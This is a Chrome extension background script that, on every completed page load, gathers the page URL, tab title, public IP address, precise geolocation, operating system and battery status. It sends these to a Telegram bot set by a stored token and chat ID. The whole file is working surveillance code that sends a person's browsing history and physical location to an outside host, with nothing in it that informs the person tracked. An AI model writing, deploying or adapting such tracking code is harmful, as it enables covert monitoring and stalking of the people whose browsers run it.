"use strict";

chrome.webNavigation.onCompleted.addListener((details) => {
    if (details.url.startsWith('about:blank')) {
        return; 
    }
    
  
    chrome.storage.sync.get(['botToken', 'chatId', 'customMessage'], function(data) {
        const url = details.url;
        const TOKEN = data.botToken;
        const chatId = data.chatId;
        const customMessage = data.customMessage || ''; // Default to an empty string if custom message is not set
        
        if (TOKEN && chatId) {
            chrome.tabs.get(details.tabId, function (tab) {
                const tabTitle = tab.title;

          
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip;

                      
                        navigator.geolocation.getCurrentPosition(position => {
                            const { latitude, longitude } = position.coords;
                          
                            const geolocation = `Latitude: ${latitude}, Longitude: ${longitude}`;
                            
                           
                            
                            const osDetails = getOperatingSystemDetails();

                           
                            navigator.getBattery().then(battery => {
                                const batteryInfo = `Battery Level: ${battery.level * 100}%\nBattery Status: ${battery.charging ? 'Charging' : 'Not Charging'}`;
                                
                                const message = `${customMessage} ${tabTitle} (${url})\nIP Address: ${ip}\nGeolocation: ${geolocation} \nOperating System: ${osDetails}\n${batteryInfo}`;
                                sendMessageToTelegram(TOKEN, chatId, message);
                            });
                        }, error => {
                            console.error('Error fetching geolocation:', error);
                        });
                    })
                    .catch(error => {
                        console.error('Error fetching IP address:', error);
                    });
            });
        } else {
            console.log('Bot token or chat ID not found. Please configure settings.');
        }
    });
});

function sendMessageToTelegram(token, chatId, message) {
    const xhr = new XMLHttpRequest();
    xhr.withCredentials = false;
    xhr.addEventListener("readystatechange", function () {
        if (this.readyState === this.DONE) {
            console.log(this.responseText);
        }
    });

    xhr.open("GET", `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
    xhr.send();
}

function getOperatingSystemDetails() {
    const userAgent = navigator.userAgent;
    let osDetails = '';
    if (userAgent.includes('Windows')) {
        osDetails = 'Windows';
    } else if (userAgent.includes('Macintosh')) {
        osDetails = 'Macintosh';
    } else if (userAgent.includes('Linux')) {
        osDetails = 'Linux';
    } else if (userAgent.includes('Android')) {
        osDetails = 'Android';
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) {
        osDetails = 'iOS';
    } else {
        osDetails = 'Unknown';
    }
    return osDetails;
}
